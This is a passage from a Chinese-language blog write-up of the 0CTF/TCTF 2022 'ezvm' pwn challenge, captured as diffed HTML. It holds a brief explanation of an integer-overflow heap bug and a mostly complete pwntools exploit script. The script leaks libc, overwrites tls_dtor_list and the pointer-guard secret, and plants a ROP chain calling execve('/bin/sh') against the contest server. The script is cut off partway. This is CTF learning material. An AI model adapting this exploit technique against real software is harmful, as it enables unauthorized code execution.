@@ -1,0 +1,518 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="我他喵的" href="http://example.com/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="我他喵的" href="http://example.com/atom.xml" />
+<link rel="alternate" type="application/json" title="我他喵的" href="http://example.com/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="writeup" />
+
+
+<link rel="canonical" href="http://example.com/2022/09/20/tctf2022ezvm/">
+
+
+
+  <title>
+tctf2022ezvm - pwn |
+dreamcat = 我他喵的</title>
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">tctf2022ezvm
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="Created: 2022-09-20 14:08:33">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">Posted on</span>
+    <time itemprop="dateCreated datePublished" datetime="2022-09-20T14:08:33+08:00">2022-09-20</time>
+  </span>
+  <span class="item" title="Symbols count in article">
+    <span class="icon">
+      <i class="ic i-pen"></i>
+    </span>
+    <span class="text">Symbols count in article</span>
+    <span>5.6k</span>
+    <span class="text">words</span>
+  </span>
+  <span class="item" title="Reading time">
+    <span class="icon">
+      <i class="ic i-clock"></i>
+    </span>
+    <span class="text">Reading time</span>
+    <span>5 mins.</span>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="Toggle navigation bar">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">dreamcat</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+        <ul>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipeubcbajj20zk0m8h1h.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipewkhf1zj20zk0m81kx.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevgoki5j20zk0m84qp.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giciuv0socj20zk0m8qes.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1gipevarprfj20zk0m8npd.jpg"></li>
+          <li class="item" data-background-image="https://tva1.sinaimg.cn/large/6833939bly1giclg5ms2rj20zk0m8u0x.jpg"></li>
+        </ul>
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">Home</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/pwn/" itemprop="item" rel="index" title="In pwn"><span itemprop="name">pwn</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="en">
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/20/tctf2022ezvm/">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="dreamcat">
+    <meta itemprop="description" content=", ">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="我他喵的">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h3 id="思路"><a class="markdownIt-Anchor" href="#思路">#</a> 思路</h3>
+<p>在申请 memery 的时候存在整数溢出，程序虽然会检测到，但是允许我们进行一次的整数溢出申请，这样实际的 memery 的 count 很大，但是 chunk 的大小远小于这个值，造成了堆块的越界读写。<br>
+当我们申请一个很大的堆块，会在 libc 附近分配，配合越界写，我们就可以修改 tls_dtor_list, 以及 secret 的值。<br>
+chunk 的释放冲 i 性能申请没有对其进行清空，所以，我们申请出一个 largebin 范围的 chunk，然后释放，这样再次将其申请出来的时候，在 memery [1] 会存有一个指针，就可以知道 libc 的及地址了。将这个数据存在这个 chunk+0x1d0 附近，在这里写一些数据，拼接出 mov_r_i 的指令，以及一个 jmp 到低地址的指令 释放。然后我们我们这次的时候，codesize 为 0x200, 就会将刚写进去的拼接指令，放到 code 的靠后的位置，我们只需要在 code 的最开始写一个 jmp，让 vm 跳到我们刚写的拼接指令哪里，将 libc 的放入寄存器。同时这一次的 memerycount 要发生溢出，并且在 libc 附近申请到一个 chunk. 这样根据偏移量，结合程序的一些基本运算，就得到了函数地址，gadget 地址。然后修改 tls_dtor_list 到 heap 上，并在哪里填充 rop, 以及修改 searet 的值。最后触发程序错误，直接 exit，getshell</p>
+<h3 id="exp"><a class="markdownIt-Anchor" href="#exp">#</a> exp</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r=process(&#x27;./ezvm&#x27;)</span></span><br><span class="line">r=remote(<span class="string">&#x27;202.120.7.210&#x27;</span>,<span class="number">40241</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">code =<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">push</span>(<span class="params">rig</span>):</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">0</span>)+p8(rig)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pop</span>(<span class="params">rig</span>):</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">1</span>)+p8(rig)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code+=p8(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">imul</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code+=p8(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">yu</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code+=p8(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">right</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">And</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Or</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge0</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jmp</span>(<span class="params">address</span>):</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">14</span>)+p64(address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jnz</span>(<span class="params">address</span>):</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">15</span>)+p64(address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jz</span>(<span class="params">address</span>):</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">16</span>)+p64(address)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmpequ</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code+=p8(<span class="number">17</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmpsml</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code+=p8(<span class="number">18</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmpbig</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">19</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov_r_i</span>(<span class="params">rig,num</span>):</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code+=p8(<span class="number">20</span>)+p8(rig)+p64(num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov_m_r</span>(<span class="params">rig,offset</span>):</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">21</span>)+p8(rig)+p64(offset)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mov_r_m</span>(<span class="params">rig,offset</span>):</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code +=p8(<span class="number">22</span>)+p8(rig)+p64(offset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear</span>():</span><br><span class="line">	<span class="keyword">global</span> code</span><br><span class="line">	code = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0</span></span><br><span class="line"><span class="comment">#size(stack) = 0x800 ====&gt;we can use it to save 0x100 nums</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">runcode</span>(<span class="params">code,code_size,mem_size</span>):</span><br><span class="line">	</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Please input your code size:&quot;</span>,<span class="built_in">str</span>(code_size))</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Please input your memory count:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">int</span>(mem_size/<span class="number">8</span>)))</span><br><span class="line">	r.sendlineafter(<span class="string">&quot;Please input your code:&quot;</span>,code)</span><br><span class="line"></span><br><span class="line">mov_r_i(<span class="number">0</span>,<span class="number">0x111111</span>)</span><br><span class="line">mov_r_i(<span class="number">1</span>,<span class="number">0x222222</span>)</span><br><span class="line">mov_r_i(<span class="number">2</span>,<span class="number">0x333333</span>)</span><br><span class="line">mov_r_i(<span class="number">3</span>,<span class="number">0x444444</span>)</span><br><span class="line"></span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">push(<span class="number">2</span>)</span><br><span class="line">push(<span class="number">3</span>)</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(code))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;Welcome to 0ctf2022!!&quot;</span>,<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">runcode(code,<span class="number">0xf0</span>,<span class="number">0x600</span>)</span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;brva 0x000001582&#x27;)</span></span><br><span class="line"></span><br><span class="line">clear()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak the libc</span></span><br><span class="line"></span><br><span class="line">mov_r_m(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">mov_r_m(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">mov_r_i(<span class="number">1</span>,<span class="number">0x219ce0</span>)</span><br><span class="line">mov_r_i(<span class="number">1</span>,<span class="number">0x219ce0</span>)</span><br><span class="line"></span><br><span class="line">push(<span class="number">2</span>)</span><br><span class="line">push(<span class="number">3</span>)</span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">sub()</span><br><span class="line">pop(<span class="number">0</span>)<span class="comment">#put libc into heap</span></span><br><span class="line"></span><br><span class="line">mov_r_i(<span class="number">1</span>,<span class="number">0x14000000000000</span>)</span><br><span class="line">mov_m_r(<span class="number">1</span>,<span class="number">0x3a</span>-<span class="number">0xa</span>)</span><br><span class="line">mov_m_r(<span class="number">0</span>,<span class="number">0x3b</span>-<span class="number">0xa</span>)</span><br><span class="line">mov_r_i(<span class="number">1</span>,<span class="number">0xfffffffffffe700e</span>)<span class="comment">#jmp</span></span><br><span class="line">mov_m_r(<span class="number">1</span>,<span class="number">0x3c</span>-<span class="number">0xa</span>)</span><br><span class="line">mov_r_i(<span class="number">2</span>,<span class="number">0xffff</span>)<span class="comment">#addr</span></span><br><span class="line">mov_m_r(<span class="number">2</span>,<span class="number">0x3d</span>-<span class="number">0xa</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(code))</span><br><span class="line">r.sendlineafter(<span class="string">&quot;continue&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">runcode(code,<span class="number">0xf0</span>,<span class="number">0x600</span>)</span><br><span class="line">clear()</span><br><span class="line"></span><br><span class="line"><span class="comment">#we have the libc in mem</span></span><br><span class="line">tls_offset = <span class="number">0x0028c0</span>  <span class="comment">#libc - </span></span><br><span class="line">tls_dtor_list_offset = <span class="number">0x0416d8</span><span class="comment">#libc-</span></span><br><span class="line">secret_offset = <span class="number">0x0028c0</span>-<span class="number">0x30</span></span><br><span class="line">heap_offset = <span class="number">0x43ff0</span></span><br><span class="line">sec_heap_offset = <span class="number">0x0082ec</span></span><br><span class="line">tls_dtor_list_heap_offset = <span class="number">0x0082bb</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#code3 we need to malloc  a big one</span></span><br><span class="line"></span><br><span class="line">jmp(<span class="number">0x000186</span>-<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">mov_m_r(<span class="number">0</span>,<span class="number">0</span>)	<span class="comment">#memery[0]  ==libc</span></span><br><span class="line"><span class="comment"># mov_r_i(1,secret_offset)</span></span><br><span class="line"><span class="comment"># push(1)</span></span><br><span class="line"><span class="comment"># sub()</span></span><br><span class="line"><span class="comment"># pop(2)</span></span><br><span class="line"><span class="comment"># mov_m_r(2,1)	#memery[1] = secret_address</span></span><br><span class="line">sec = <span class="number">0x5143329d0ccc697</span></span><br><span class="line">mov_r_i(<span class="number">1</span>,sec)</span><br><span class="line">mov_m_r(<span class="number">1</span>,sec_heap_offset)	<span class="comment">#secret = 0xcafebabedeadbeef</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pos_offset = <span class="built_in">int</span>(<span class="number">0x100</span>/<span class="number">8</span>)</span><br><span class="line"><span class="comment">#read rop to che chunk </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;rop</span></span><br><span class="line"><span class="string">leave_ret = libc + 0x000562ec</span></span><br><span class="line"><span class="string">prdi = libc + 0x002a3e5</span></span><br><span class="line"><span class="string">prsi = libc + 0x02be51</span></span><br><span class="line"><span class="string">prdx_pr12 = libc +0x011f497</span></span><br><span class="line"><span class="string">binsh = libc + 0x001d8698</span></span><br><span class="line"><span class="string">execve = libc + 0xeb0f0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">addr = ((leave_ret^sec)&lt;&lt;0x11)&amp;0xffffffffffff8000</span></span><br><span class="line"><span class="string">addr += ((leave_ret^sec)&gt;&gt;0x2f)&amp;0x7fff</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">rop = p64(prdi) + p64(binsh)</span></span><br><span class="line"><span class="string">rop += p64(prsi) + p64(0)</span></span><br><span class="line"><span class="string">rop += p64(prdx_pr12) + p64(0)*2</span></span><br><span class="line"><span class="string">rop += p64(execve)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">leave_ret =  <span class="number">0x000562ec</span></span><br><span class="line">prdi =  <span class="number">0x002a3e5</span></span><br><span class="line">prsi =  <span class="number">0x02be51</span></span><br><span class="line">prdx_pr12 = <span class="number">0x011f497</span></span><br><span class="line">binsh = <span class="number">0x001d8698</span></span><br><span class="line">execve =  <span class="number">0xeb0f0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#write leave ret</span></span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">mov_r_i(<span class="number">1</span>,leave_ret)</span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">add()</span><br><span class="line">mov_r_i(<span class="number">1</span>,sec)</span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">xor()</span><br><span class="line">pop(<span class="number">2</span>)</span><br><span class="line">push(<span class="number">2</span>)		<span class="comment">#2 xor save</span></span><br><span class="line">push(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">mov_r_i(<span class="number">1</span>,<span class="number">0x11</span>)</span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">left()</span><br><span class="line">mov_r_i(<span class="number">1</span>,<span class="number">0xffffffffffff8000</span>)</span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">And()</span><br><span class="line">pop(<span class="number">2</span>)		<span class="comment">#addr lef</span></span><br><span class="line">pop(<span class="number">3</span>)		</span><br><span class="line"></span><br><span class="line">push(<span class="number">3</span>)		<span class="comment">#xor res</span></span><br><span class="line">mov_r_i(<span class="number">1</span>,<span class="number">0x2f</span>)</span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">right()</span><br><span class="line">mov_r_i(<span class="number">1</span>,<span class="number">0x7fff</span>)</span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">And()</span><br><span class="line">push(<span class="number">2</span>)</span><br><span class="line">add()</span><br><span class="line">pop(<span class="number">2</span>)				<span class="comment">#leave_ret_encrept</span></span><br><span class="line"></span><br><span class="line">mov_m_r(<span class="number">2</span>,pos_offset)</span><br><span class="line">pos_offset+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pop _rdi</span></span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">mov_r_i(<span class="number">1</span>,prdi)</span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">add()</span><br><span class="line">pop(<span class="number">2</span>)</span><br><span class="line">mov_m_r(<span class="number">2</span>,pos_offset)</span><br><span class="line">pos_offset+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#binsh</span></span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">mov_r_i(<span class="number">1</span>,binsh)</span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">add()</span><br><span class="line">pop(<span class="number">2</span>)</span><br><span class="line">mov_m_r(<span class="number">2</span>,pos_offset)</span><br><span class="line">pos_offset+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pop rsi</span></span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">mov_r_i(<span class="number">1</span>,prsi)</span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">add()</span><br><span class="line">pop(<span class="number">2</span>)</span><br><span class="line">mov_m_r(<span class="number">2</span>,pos_offset)</span><br><span class="line">pos_offset+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">pos_offset+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#prdx 0 0</span></span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">mov_r_i(<span class="number">1</span>,prdx_pr12)</span><br><span class="line">push(<span class="number">1</span>)</span><br><span class="line">add()</span><br><span class="line">pop(<span class="number">2</span>)</span><br><span class="line">mov_m_r(<span class="number">2</span>,pos_offset)</span><br><span class="line">pos_offset+=<span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#execve</span></span><br><span class="line">push(<span class="number">0</span>)</span><br><span class="line">mov_r_i(<span class="number">1</span>,execve)</span><br><span class="line">push(<span 